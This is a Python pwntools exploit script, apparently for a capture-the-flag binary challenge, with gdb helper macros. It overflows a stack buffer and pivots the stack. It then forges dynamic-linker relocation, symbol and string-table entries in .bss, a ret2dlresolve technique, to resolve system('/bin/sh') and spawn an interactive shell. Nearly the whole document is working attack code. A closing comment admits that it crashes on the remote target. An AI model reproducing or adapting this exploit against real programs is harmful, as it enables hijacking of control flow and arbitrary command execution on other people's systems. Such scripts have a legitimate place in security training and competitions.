#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=False)
# libc = exe.libc
context.terminal = ["tmux", "splitw", "-h"]
# context.encoding = 'utf-8'

gdbscript = '''
# tbreak main
b *vuln+29
dir ./glibc-2.35
# b *0x40116D
b _dl_fixup
set follow-fork-mode parent


define tt
    eq $rsp 0x2bd
    eq $rsp+8 0x4011C2

    # Elf64_Rel (fake_relaplt)
    # r_offset, this is where the function pointer is stored after resolving - setbuf GOT
    eq 0x404778 0x404018
    
    # r_info
    eq 0x404780 0x2d300000007

    
    # Elf64_Sym

    # st_name
    ed 0x4047a8 0x4320
    # st_info
    eb 0x4047a8+4 0x12
    # st_other
    eb 0x4047a8+5 0
    # st_shndx
    ew 0x4047a8+6 0x0
    # st_value
    eq 0x4047a8+8 0
    # st_size
    eq 0x4047a8+16 0

    
    # symstr, system
    eq 0x4047c0 0x006d6574737973



    # change stdout to /bin/sh
    
    set $rip = 0x401020
end

define tt2
    eq $rsp 0x292


    # change stdout to /bin/sh
    
    set $rip = 0x401020
end

continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper

# pause()

if args.POC:
    print(rl())
    print(rl())
    print(rl())
    cmd = rl().strip().decode()
    print(cmd)
    # from subprocess import check_output
    # out = check_output(cmd, shell=True)
    # print(out.decode())
    sla(b'Solution? ',input().encode().strip())
    ru(b'Correct')

OFFSET = 40

# s(cyclic(0x60))

# 0x004011c0: leave; ret;
leave_ret = 0x004011c0

# 0x004011e3: pop rbp; ret;
pop_rbp_ret = 0x004011e3

lea_read = 0x4011A9 


def align(addr):
    return (0x18 - (addr) % 0x18)

PLT0 = exe.get_section_by_name(".plt")["sh_addr"]
BSS = exe.get_section_by_name(".bss")["sh_addr"]
STRTAB, SYMTAB, JMPREL = map(exe.dynamic_value_by_tag,["DT_STRTAB", "DT_SYMTAB", "DT_JMPREL"])

debug(f"PLT0: {hex(PLT0)}")
debug(f"BSS: {hex(BSS)}")
debug(f"STRTAB: {hex(STRTAB)}")
debug(f"SYMTAB: {hex(SYMTAB)}")
debug(f"JMPREL: {hex(JMPREL)}")

RW_AREA = exe.bss(0x300) # .bss + 0x700

debug("-"*80)

# Fake .rela.plt
fake_relaplt = RW_AREA + 0x20 # Right after reloc_arg
fake_relaplt += align(fake_relaplt - JMPREL) # Alignment in x64 is 0x18
reloc_arg = (fake_relaplt - JMPREL) // 0x18

debug("Fake .rela.plt starts at: " + hex(fake_relaplt))
debug("reloc_arg is: " + hex(reloc_arg))
debug("Expected fake .rela.plt at: hex(reloc_arg*0x18 + JMPREL) => " + hex(reloc_arg*0x18 + JMPREL))
debug("-"*80)


# Fake .symtab
fake_symtab = fake_relaplt + 0x18
fake_symtab = RW_AREA + 0x100 + 0x20

fake_symtab += align(fake_symtab - SYMTAB) # Alignment in x64 is 0x18
r_info = (((fake_symtab - SYMTAB) // 0x18) << 32) | 0x7 # | 0x7 to bypass check 4.

debug("Fake .symtab starts at: " + hex(fake_symtab))
debug("r_info is: " + hex(r_info))
debug("Expected fake .symtab at: hex(((r_info >> 32)*0x18) + SYMTAB) => " + hex(((r_info >> 32)*0x18) + SYMTAB)) # *0x18 because it is used as index
debug("-"*80)


# Fake .strtab
fake_symstr = fake_symtab + 0x18
fake_symstr = RW_AREA + 0x200 + 0x20
st_name = fake_symstr - STRTAB
bin_sh = fake_symstr + 0x8

debug("Fake .symstr starts at: " + hex(fake_symstr))
debug("st_name is: " + hex(st_name))
debug("Expected fake .strtab at: hex(STRTAB + st_name) => " + hex(STRTAB + st_name))
debug("-"*80)


g2 = 0x4011A2 # mov rbp, rsp
g3 = 0x4011A5 # sub
g4 = 0x401083

s(flat({
    OFFSET-8: fake_relaplt+0x20-0x10, # rbp
    OFFSET: g3,
}))


lea_read = exe.sym['vuln']

s(flat({
    0+0x10: 0x404018, # r_offset, this is where the function pointer is stored after resolving - setbuf GOT
    8+0x10: r_info, # r_info
    OFFSET-8: fake_symtab+0x20-0x10, # rbp
    OFFSET: g3,
}))

s(flat({
    0+0x10: p32(st_name), # st_name
    4+0x10: p8(0x12), # st_info
    5+0x10: p8(0), # st_other
    6+0x10: p16(0), # st_shndx
    8+0x10: p64(0), # st_value
    16+0x10: p64(0), # st_size
    OFFSET-8: fake_symstr+0x20-0x10, # rbp
    OFFSET: g3,
}))


s(flat({
    0+0x10: b'system\x00', # st_name, system
    OFFSET-8: 0x404060+0x20-0x10, # rbp
    OFFSET: g3,
}))

s(flat({
    0+0x10: 0x404068, # points below
    0+0x18: b'/bin/sh\x00',
    OFFSET-8: exe.bss(0xf00-8), # rbp
    OFFSET: g3,
}))

dl_resolve = 0x401020

## end setup

s(flat({
    OFFSET-8: exe.bss(0xf00-0x20-8), # rbp
    OFFSET: g3,
}))


s(flat({
    OFFSET-8: exe.bss(0xf00-0x20-8), # rbp
    OFFSET: g3, # dl_resolve
}))

s(flat({
    8: exe.sym['vuln'],
    0x10: 0x401020,
    0x18: reloc_arg,
    OFFSET-8: 0x401186, # rbp
}))

s(b'A')


ia()


"""
pwndbg> ptype /o sym
type = const struct {
/*      0      |       4 */    Elf64_Word st_name;
/*      4      |       1 */    unsigned char st_info;
/*      5      |       1 */    unsigned char st_other;
/*      6      |       2 */    Elf64_Section st_shndx;
/*      8      |       8 */    Elf64_Addr st_value;
/*     16      |       8 */    Elf64_Xword st_size;

                               /* total size (bytes):   24 */
                             } *

pwndbg> ptype /o reloc
type = const struct {
/*      0      |       8 */    Elf64_Addr r_offset;
/*      8      |       8 */    Elf64_Xword r_info;
/*     16      |       8 */    Elf64_Sxword r_addend;

                               /* total size (bytes):   24 */
                             } * const
"""


# works on local, but crashes on remote
